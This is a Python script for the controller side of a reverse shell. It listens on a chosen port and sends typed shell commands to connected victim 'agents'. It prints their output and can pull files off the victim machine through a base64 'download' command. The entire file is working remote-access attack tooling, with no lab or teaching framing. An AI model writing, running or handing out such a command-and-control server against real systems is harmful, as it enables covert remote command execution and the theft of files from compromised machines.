import socket
import optparse
import sys
import threading
import json
import base64

class MyTCPServer:
    def __init__(self) -> None:
        self.port = self.get_param()
        try:
            self.s_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.s_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            # self.s_socket.bind(('0.0.0.0', self.port))
            self.s_socket.bind(('0.0.0.0', self.port))
            self.s_socket.listen(5)
            print("[+] Start listening on the port %d" % self.port)
        except Exception as e:
            print("[-] Failed to create listener: %s" % e)
            sys.exit()

    def get_param(self):
        parser = optparse.OptionParser('./%s -p port' % sys.argv[0])
        parser.add_option('-p', '--port', dest='port', type='int', help='Specify port number')
        options, args = parser.parse_args()
        if options.port is None:
            print("[-] Specify port first")
            sys.exit()
        return options.port
    
    def reliable_send(self,client_socket,data):
        client_socket.send(json.dumps(data).encode('utf-8'))
    
    def reliable_recv(self,client_socket):
        data = ""
        
        while True:
            try:
                recv_data = client_socket.recv(1024)               
                data = data + recv_data.decode('utf-8')
                return json.loads(data)

            except ValueError:
                continue
    
    def download_file(self, client_socket,file_path):
        """
        Receive data from agent and write into the file with the same filename
        """
     
        recv_data = self.reliable_recv(client_socket)
        if recv_data.strip() == 'no file':
            print("No such file in the current directory")
        else:
            """
            Very import to encode here, otherwise b64decode method will output wrong result
            """
            recv_data_2 = recv_data.encode('ascii')          
            write_data = base64.b64decode(recv_data_2)          
            with open(file_path, 'wb') as f:
                f.write(base64.b64decode(recv_data_2))       
            print('Downloaded successfully')



    def client_handler(self, client_socket, client_address):
        print("[+] Connected from :%s" % str(client_address))
        while True:
            command = input("%s~ " % client_address[0])
            if command == 'q':
                break
            if command == '':
                continue
            if command.startswith('cd'):
                self.reliable_send(client_socket,command)
                recv_data = self.reliable_recv(client_socket)
                print(recv_data)
                continue
            if command.startswith('download'):
                print('Begin to download file...')
                self.reliable_send(client_socket,command)
                file_path = command.split()[1]
                self.download_file(client_socket, file_path)
                continue

           
            self.reliable_send(client_socket,command)         
            recv_data = self.reliable_recv(client_socket)          
            print(recv_data)
        
        client_socket.close()


    def run(self):
        try:
            while True:
                client_socket, client_address = self.s_socket.accept()
                t = threading.Thread(target=self.client_handler, args=(client_socket, client_address))
                t.start()

        except KeyboardInterrupt:
            print("[-] Exit the program now")
            sys.exit()
        except Exception as e:
            print("[-] Something is wrong: %s" % e)
            sys.exit()


if __name__ == '__main__':
    server = MyTCPServer()
    server.run()